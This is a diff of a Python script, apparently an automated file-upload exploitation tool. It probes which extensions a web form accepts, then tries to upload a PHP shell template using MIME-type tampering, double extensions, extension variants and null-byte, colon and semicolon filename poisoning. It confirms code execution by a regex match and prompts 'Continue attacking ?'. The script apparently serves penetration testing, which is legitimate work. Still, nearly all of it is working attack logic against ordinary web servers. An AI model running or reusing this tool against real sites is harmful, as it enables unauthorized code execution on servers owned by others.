@@ -155,8 +155,11 @@ fileInput = {"name":up.inputName}
 
 ###### VALID EXTENSIONS DETECTION FOR THIS FORM ######
 if not args.skipRecon :
-	n = up.detectValidExtensions(extensions,args.n)
-	logger.info("### Tried %s extensions, %s are valid.",args.n,len(up.validExtensions))
+	if len(args.legitExtensions) > 0 :
+		n = up.detectValidExtensions(extensions,args.n,args.legitExtensions)
+	else :
+		n = up.detectValidExtensions(extensions,args.n)
+	logger.info("### Tried %s extensions, %s are valid.",n,len(up.validExtensions))
 else :
 	logger.info("### Skipping detection of valid extensions, using provided extensions instead (%s)",args.legitExtensions)
 	up.validExtensions = args.legitExtensions
@@ -165,63 +168,85 @@ if up.validExtensions == [] :
 	logger.error("No valid extension found.")
 	exit()
 
+input()
 
-#################### TEMPLATE CHOICI HERE, NEEDS TO CHANGE LATER ######################
-template = "template.php"##############################################################
-codeExecDetectionRegex = "hacked"######################################################
+#################### TEMPLATE CHOICE HERE, NEEDS TO CHANGE LATER ######################
+templates = [
+	{
+	"filename":"template.php",
+	"extension":"php",
+	"codeExecRegex":"74b928cc738434fb9e4d2f387398958c7e5e816a921ad7d8226ebff094f5ad7b5ec865beccf654e7eca540dd6dd3e17aa11df23f9101ab8436b724ab0bef168b",
+	"extVariants":["php1","php2","php3","php4","php5","phtml","pht"]}
+	]
 #######################################################################################
-templatefd = open(template,"rb")
-nastyExt = template.split(".")[-1]
-nastyMime = getMime(extensions,nastyExt)
-nastyExtVariants = {"php":["php1","php2","php3","php4","php5","phtml"]}
-#################################################################
-logger.info("### Starting shell upload detection (messing with file extensions and mime types...)")
-#une technique = un suffix, un mime, un contenu, une regex de code exec detection
-attempts = []
-##
-##Naive attempt
-attempts.append({"suffix":"."+"$nastyExt$","mime":"$nastyMime$"})
-##mime type tampering
-attempts.append({"suffix":"."+"$nastyExt$","mime":"$legitMime$"})
-##double extension bad.good with nasty mime type
-attempts.append({"suffix":"."+"$nastyExt$.$legitExt$","mime":"$nastyMime$"})
-##double extension bad.good with gentle mime type
-attempts.append({"suffix":"."+"$nastyExt$.$legitExt$","mime":"$legitMime$"})
-##double extension good.bad with nasty mime type
-attempts.append({"suffix":"."+"$legitExt$.$nastyExt$","mime":"$nastyMime$"})
-##double extension good.bad with good mime type
-attempts.append({"suffix":"."+"$legitExt$.$nastyExt$","mime":"$legitMime$"})
-
-#########################################################################################
-codeExecObtained = False
-nbOfValidExtensions = len(up.validExtensions)
-nbOfEntryPointsFound = 0
-i = 0
-while not codeExecObtained and i < nbOfValidExtensions :
-	legitExt = up.validExtensions[i]
-	legitMime = getMime(extensions,legitExt)
-	#exec all known techniques
-	for a in attempts :
-		suffix = a["suffix"].replace("$nastyExt$",nastyExt)
-		suffix = suffix.replace("$legitExt$",legitExt)
-		suffix = suffix.replace("$nastyMime$",nastyMime)
-		suffix = suffix.replace("$legitMime$",legitMime)
-		mime = a["mime"].replace("$nastyExt$",nastyExt)
-		mime = mime.replace("$legitExt$",legitExt)
-		mime = mime.replace("$nastyMime$",nastyMime)
-		mime = mime.replace("$legitMime$",legitMime)
-		res = up.submitTestCase(suffix,mime,templatefd.read(),codeExecDetectionRegex)
-		templatefd.seek(0)
-		if res["codeExec"] :
-			logging.info("\033[1m\033[42mCode execution obtained ('%s','%s','%s')\033[m",suffix,mime,template)
-			nbOfEntryPointsFound += 1
-			cont = input("Continue attacking ? [y/N] : ")
-			if cont not in ["y","Y","yes","YES","Yes"] :
-				logging.info("%s entry point(s) found using %s HTTP requests.",nbOfEntryPointsFound,up.httpRequests)
-				exit()
+for template in templates :
+	#template[0] : file name
+	#template[1] : extension
+	#template[2] : regex for code exec detection
+	#template[3] : extensions variants
+	templatefd = open(template["filename"],"rb")
+	nastyExt = template["extension"]
+	nastyMime = getMime(extensions,nastyExt)
+	nastyExtVariants = template["extVariants"]
+	#################################################################
+	logger.info("### Starting shell upload detection (messing with file extensions and mime types...)")
 
 
-	i += 1
 
-templatefd.close()
+	attempts = []
+	##Naive attempt
+	attempts.append({"suffix":"."+nastyExt,"mime":nastyMime})
+	#########################################################################################
+	codeExecObtained = False
+	nbOfValidExtensions = len(up.validExtensions)
+	nbOfEntryPointsFound = 0
+	i = 0
+	while not codeExecObtained and i < nbOfValidExtensions :
+		legitExt = up.validExtensions[i]
+		legitMime = getMime(extensions,legitExt)
+		#exec all known techniques
+		##	for each variant of the code execution trigerring extension (php,asp etc)
+		### using either bad or good mime type
+		for nastyVariant in nastyExtVariants+[nastyExt] :
+			##mime type tampering
+			attempts.append({"suffix":"."+nastyVariant,"mime":legitMime})
+			##double extension bad.good with nasty mime type
+			attempts.append({"suffix":"."+nastyVariant+"."+legitExt,"mime":nastyMime})
+			##double extension bad.good with gentle mime type
+			attempts.append({"suffix":"."+nastyVariant+"."+legitExt,"mime":legitMime})
+			##double extension good.bad with nasty mime type
+			attempts.append({"suffix":"."+legitExt+"."+nastyVariant,"mime":nastyMime})
+			##double extension good.bad with good mime type
+			attempts.append({"suffix":"."+legitExt+"."+nastyVariant,"mime":legitMime})
+			##null byte poisoning - legit mime type
+			attempts.append({"suffix":"."+nastyVariant+"%00."+legitExt,"mime":legitMime})
+			##null byte poisoning - nasty mime type
+			attempts.append({"suffix":"."+nastyVariant+"%00."+legitExt,"mime":nastyMime})
+			##':' byte poisoning - legit mime type
+			attempts.append({"suffix":"."+nastyVariant+":."+legitExt,"mime":legitMime})
+			##':' byte poisoning - nasty mime type
+			attempts.append({"suffix":"."+nastyVariant+":."+legitExt,"mime":nastyMime})
+			##';' byte poisoning - legit mime type
+			attempts.append({"suffix":"."+nastyVariant+";."+legitExt,"mime":legitMime})
+			##';' byte poisoning - nasty mime type
+			attempts.append({"suffix":"."+nastyVariant+";."+legitExt,"mime":nastyMime})
+
+		for a in attempts :
+			suffix = a["suffix"]
+			mime = a["mime"]
+
+			res = up.submitTestCase(suffix,mime,templatefd.read(),template["codeExecRegex"])
+			templatefd.seek(0)
+			if res["codeExec"] :
+				logging.info("\033[1m\033[42mCode execution obtained ('%s','%s','%s')\033[m",suffix,mime,template["filename"])
+				nbOfEntryPointsFound += 1
+				cont = input("Continue attacking ? [y/N] : ")
+				if cont not in ["y","Y","yes","YES","Yes"] :
+					logging.info("%s entry point(s) found using %s HTTP requests.",nbOfEntryPointsFound,up.httpRequests)
+					exit()
+
+
+		i += 1
+	templatefd.close()
+
 logging.info("%s entry point(s) found using %s HTTP requests.",nbOfEntryPointsFound,up.httpRequests)
